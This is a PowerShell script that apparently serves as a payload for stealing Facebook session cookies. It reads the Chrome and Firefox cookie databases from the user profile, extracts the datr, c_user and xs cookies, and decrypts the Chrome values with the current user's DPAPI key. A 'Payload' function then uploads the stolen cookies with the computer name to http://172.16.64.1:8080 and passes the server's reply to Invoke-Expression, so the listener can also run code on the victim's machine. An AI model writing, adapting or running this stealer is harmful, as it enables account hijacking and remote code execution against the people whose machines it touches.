# Instructions: import the module, then perform the commanded needed.

# Chrome Facebook cookies extraction
# Use: Get-FacebookCreds [path to Login Data]
# Path is optional, use if automatic search doesn't work

function Get-FacebookCreds-Firefox() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
        # $Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
		$path = Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}

	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# First the magic bytes for the facebook string, datr size is 24
	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x64\x61\x74\x72([\s\S]{24})'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$datr = $PwdMatches | ForEach-Object { $_.Groups[1].Value }
	# $datr = $PwdMatches.groups[1]

	# First the magic bytes for the facebook string, c_user size is 15
	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x63\x5F\x75\x73\x65\x72([\s\S]{15})'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$c_user = $PwdMatches | ForEach-Object { $_.Groups[1].Value }
	# $c_user = $PwdMatches.groups[1]

	# First the magic bytes for the facebook string, xs size is 44
	$PwdRegex = [Regex] '\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x78\x73([\s\S]{44})'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$xs = $PwdMatches | ForEach-Object { $_.Groups[1].Value }
	# $xs = $PwdMatches.groups[1]

	"Firefox ---> "
	"datr is $datr ###"
	"c_user is $c_user ###"
	"xs is $xs ###"
}

function Get-FacebookCreds-Chrome() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
        $Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}

	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# First the magic bytes for the facebook string, datr size is 242 + 4 and hex is \x64\x61\x74\x72
	$PwdRegex = [Regex] '\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D(\x64\x61\x74\x72)\x2F[\s\S]*?(\x01\x00\x00\x00[\s\S]{242})'
	$PwdMatches = $PwdRegex.Matches($BinaryText)

	# [System.BitConverter]::ToString($Encoding.GetBytes($PwdMatches.groups[2]));
	$Pwd = $Encoding.GetBytes(($PwdMatches | ForEach-Object { $_.Groups[2].Value }))
	# $Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
	$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
	$datr = [System.Text.Encoding]::Default.GetString($Decrypt)


	# First the magic bytes for the facebook string, c_user size is 226 + 4 and hex is \x63\x5F\x75\x73\x65\x72
	$PwdRegex = [Regex] '\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D(\x63\x5F\x75\x73\x65\x72)\x2F[\s\S]*?(\x01\x00\x00\x00[\s\S]{226})'
	$PwdMatches = $PwdRegex.Matches($BinaryText)

	# [System.BitConverter]::ToString($Encoding.GetBytes($PwdMatches.groups[2]));
	$Pwd = $Encoding.GetBytes(($PwdMatches | ForEach-Object { $_.Groups[2].Value }))
	# $Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
	$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
	$c_user = [System.Text.Encoding]::Default.GetString($Decrypt)


	# First the magic bytes for the facebook string, xs size is 258 + 4 and hex is \x78\x73
	$PwdRegex = [Regex] '\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D(\x78\x73)\x2F[\s\S]*?(\x01\x00\x00\x00[\s\S]{258})'
	$PwdMatches = $PwdRegex.Matches($BinaryText)

	# [System.BitConverter]::ToString($Encoding.GetBytes($PwdMatches.groups[2]));
	$Pwd = $Encoding.GetBytes(($PwdMatches | ForEach-Object { $_.Groups[2].Value }))
	# $Pwd = $Encoding.GetBytes($PwdMatches.groups[2])
	$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
	$xs = [System.Text.Encoding]::Default.GetString($Decrypt)

	"Chrome ---> "
	"datr is $datr ###"
	"c_user is $c_user ###"
	"xs is $xs ###"
}


function Payload() {

	Invoke-Expression (New-Object Net.WebClient).UploadString("http://172.16.64.1:8080/$env:computername", $(Get-FacebookCreds-Chrome))
	Invoke-Expression (New-Object Net.WebClient).UploadString("http://172.16.64.1:8080/$env:computername", $(Get-FacebookCreds-Firefox))

}